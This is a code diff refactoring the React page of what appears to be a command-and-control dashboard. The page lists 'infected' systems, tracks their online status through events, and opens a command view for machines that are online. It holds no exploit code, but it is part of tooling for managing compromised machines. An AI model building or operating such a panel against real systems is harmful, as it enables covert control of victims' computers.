@@ -4,31 +4,32 @@ import type { Infected } from "../types/infected.ts";
 import api from "../api/baseUrl.ts";
 import { InfectedCard } from "../components/InfectedCard.tsx";
 import { useTitle } from "../hooks/useTitle.ts";
+import { useStore } from "../hooks/useStore.ts";
+import type { InfectedStatus } from "../sse.ts";
 
 export const InfectedPage: React.FC = () => {
     const navigate = useNavigate();
-    const [infected, setInfected] = useState<Infected[]>();
+    const { infected, setInfected } = useStore();
+    const { loggedIn } = useStore();
+
     useTitle("InfectedPage");
 
-    /**
-     * If the user is not authenticated, he will be redirected to /login
-     */
     const obtainAllInfectedSystems = async () => {
-        try {
+        if (loggedIn) {
             const response = await api.get("/infected/allInfected");
             setInfected(response.data as Infected[]);
             console.log(response.data)
-        } catch (error) {
-            localStorage.removeItem("isLoggedIn");
-
-            setTimeout(() => {
-                navigate("/login");
-            }, 3000);
         }
     }
 
     const command = (infected: Infected) => {
         console.log(infected.latestIpAddress);
+        if (infected.online) {
+            navigate(`/infected/${infected.iid}`)
+        }
+        else {
+            console.log(`Infected ${infected.iid} is offline!`);
+        }
     }
 
     /**
@@ -36,27 +37,23 @@ export const InfectedPage: React.FC = () => {
      */
 
     useEffect(() => {
-        const sse = new EventSource("/api/infected/sse/status");
-
-        sse.addEventListener("status.updated", (e) => {
-            const data = JSON.parse(e.data);
-            setInfected(prev => prev?.map(infected => {
-                if (infected.iid == data.iid) {
+        const sseHandler = ((e: CustomEvent) => {
+            const { detail: infectedStatus }: { detail: InfectedStatus } = e;
+            setInfected(prev => prev.map(infected => {
+                if (infected.iid == infectedStatus.iid) {
                     return {
                         ...infected,
-                        online: data.online
+                        online: infectedStatus.online
                     }
                 }
 
                 return infected;
             }))
-            console.log("Status updated:", data);
-        })
+            console.log("Status updated:", infectedStatus);
+        }) as EventListener;
 
-        sse.onopen = () => console.log("SSE connected");
-        sse.onerror = (e) => console.error("SSE error", e);
+        window.addEventListener('infected-status', sseHandler)
 
-        const loggedIn = localStorage.getItem("isLoggedIn");
         if (!loggedIn) {
             navigate("/login");
             return;
@@ -64,7 +61,7 @@ export const InfectedPage: React.FC = () => {
         obtainAllInfectedSystems();
 
         return () => {
-            sse.close();
+            window.removeEventListener('infected-status', sseHandler);
         }
     }, []);
 
